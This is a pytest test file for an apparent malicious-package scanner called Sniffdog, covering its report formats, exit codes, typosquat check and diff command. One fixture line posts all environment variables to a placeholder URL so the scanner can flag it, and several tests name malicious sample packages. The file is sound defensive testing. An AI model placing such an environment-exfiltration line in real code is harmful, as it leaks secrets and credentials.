import json

from sniffdog.cli import main


def test_scan_json_and_exit_code(corpus, capsys):
    rc = main(["scan", str(corpus / "malicious" / "py-setup-env-exfil"), "-f", "json", "--no-metadata"])
    out = json.loads(capsys.readouterr().out)
    assert rc == 1 and out["results"][0]["verdict"] == "malicious"
    assert all("fingerprint" in f for f in out["results"][0]["findings"])


def test_scan_clean_exit_zero(corpus, capsys):
    assert main(["scan", str(corpus / "benign" / "py-api-client-token"), "-f", "json"]) == 0


def test_sarif_shape(corpus, tmp_path):
    out = tmp_path / "r.sarif"
    main(["scan", str(corpus / "malicious" / "js-scope-squat"), "-f", "sarif", "-o", str(out)])
    s = json.loads(out.read_text())
    run = s["runs"][0]
    assert s["version"] == "2.1.0" and run["tool"]["driver"]["name"] == "Sniffdog"
    ids = {r["id"] for r in run["tool"]["driver"]["rules"]}
    for res in run["results"]:
        assert res["ruleId"] in ids and res["level"] in ("error", "warning", "note", "none")
        assert float(res["properties"]["security-severity"]) >= 0
        assert res["locations"][0]["physicalLocation"]["region"]["startLine"] >= 1


def test_html_and_markdown(corpus, tmp_path, capsys):
    main(["scan", str(corpus / "malicious" / "py-layered-b64"), "-f", "html", "-o", str(tmp_path / "r.html")])
    html = (tmp_path / "r.html").read_text()
    assert "<!doctype html>" in html and "PY-EXEC-OBFUSCATED" in html and "decoded payload" in html
    main(["scan", str(corpus / "malicious" / "py-layered-b64"), "-f", "markdown"])
    md = capsys.readouterr().out
    assert "| Package | Verdict |" in md


def test_fail_on_threshold(corpus):
    assert main(["scan", str(corpus / "malicious" / "py-setup-env-exfil"), "-f", "json", "-o", "/dev/null", "--fail-on", "critical"]) == 1


def test_typosquat_command(capsys):
    assert main(["typosquat", "reqeusts"]) == 1
    assert "requests" in capsys.readouterr().out
    assert main(["typosquat", "-e", "npm", "lodash"]) == 0


def test_rules_command_lists_every_emitted_rule(corpus, capsys):
    from sniffdog.config import Config
    from sniffdog.rules import RULES
    from sniffdog.scanner import Scanner

    s = Scanner(Config(metadata=False, min_severity=0))
    emitted = {f.rule_id for d in (corpus / "malicious").iterdir() for f in s.scan_path(d).findings}
    assert emitted <= set(RULES), emitted - set(RULES)
    assert main(["rules"]) == 0


def test_diff_command_on_paths(tmp_path, capsys):
    a, b = tmp_path / "a", tmp_path / "b"
    a.mkdir()
    b.mkdir()
    (a / "m.py").write_text("x = 1\n")
    (b / "m.py").write_text("import os, requests\nrequests.post('u', data=str(os.environ))\n")
    assert main(["diff", str(a), str(b), "-f", "json"]) == 1
    assert json.loads(capsys.readouterr().out)["added"][0]["rule_id"] == "PY-EXFIL"
